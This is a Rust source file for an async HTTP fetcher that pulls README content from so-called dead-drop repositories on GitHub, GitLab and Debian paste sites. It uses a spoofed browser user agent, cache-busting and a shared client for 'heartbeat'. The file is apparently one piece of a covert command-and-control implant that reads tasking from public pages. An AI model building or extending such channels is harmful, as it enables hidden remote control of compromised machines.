//! Fetcher: async HTTP client for reading README content from dead-drop repos.
//!
//! Handles fetching from GitHub, GitLab, and Debian paste sources.
//! Supports both raw URL fetching and authenticated API access.

use reqwest::Client;
use std::time::Duration;
use tracing::debug;

use arcticfox_core::config::RepoSource;
use arcticfox_core::error::{ArcticFoxError, Result};

const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
const FETCH_TIMEOUT: Duration = Duration::from_secs(15);
const MAX_FETCH_SIZE: usize = 2 * 1024 * 1024; // 2 MB

pub struct Fetcher {
    client: Client,
}

impl Fetcher {
    /// Create a new fetcher with a configured HTTP client.
    pub fn new() -> Result<Self> {
        let client = Client::builder()
            .user_agent(USER_AGENT)
            .timeout(FETCH_TIMEOUT)
            .tcp_nodelay(true)
            .pool_idle_timeout(Duration::from_secs(90))
            .pool_max_idle_per_host(5)
            .build()
            .map_err(|e| ArcticFoxError::Internal {
                message: format!("Failed to build HTTP client: {e}"),
            })?;

        Ok(Fetcher { client })
    }

    /// Get a clone of the HTTP client (for heartbeat, etc.)
    pub fn client(&self) -> Client {
        self.client.clone()
    }

    /// Fetch README content from a repo source.
    pub async fn fetch_readme(&self, repo: &RepoSource) -> Result<String> {
        let url = repo.raw_url();
        
        // Add cache-busting
        let cache_bust = format!(
            "{}nocache={}&t={}",
            if url.contains('?') { "&" } else { "?" },
            rand::random::<u32>(),
            chrono::Utc::now().timestamp(),
        );
        let full_url = format!("{}{}", url, cache_bust);

        debug!("Fetching {}", repo.label());

        let resp = self
            .client
            .get(&full_url)
            .header("Accept", "text/plain, application/vnd.github.v3.raw")
            .header("Cache-Control", "no-cache, no-store")
            .header("Pragma", "no-cache")
            .send()
            .await
            .map_err(|e| ArcticFoxError::Http {
                url: full_url.clone(),
                source: e,
            })?;

        let status = resp.status();
        if !status.is_success() {
            let body = resp.text().await.unwrap_or_default();
            return Err(ArcticFoxError::http_status(
                full_url,
                status.as_u16(),
                body,
            ));
        }

        let bytes = resp
            .bytes()
            .await
            .map_err(|e| ArcticFoxError::Http {
                url: full_url,
                source: e,
            })?;

        // Truncate to max fetch size
        let limited = if bytes.len() > MAX_FETCH_SIZE {
            &bytes[..MAX_FETCH_SIZE]
        } else {
            &bytes
        };

        String::from_utf8(limited.to_vec()).map_err(|e| ArcticFoxError::Internal {
            message: format!("Invalid UTF-8 in fetched content: {e}"),
        })
    }
}
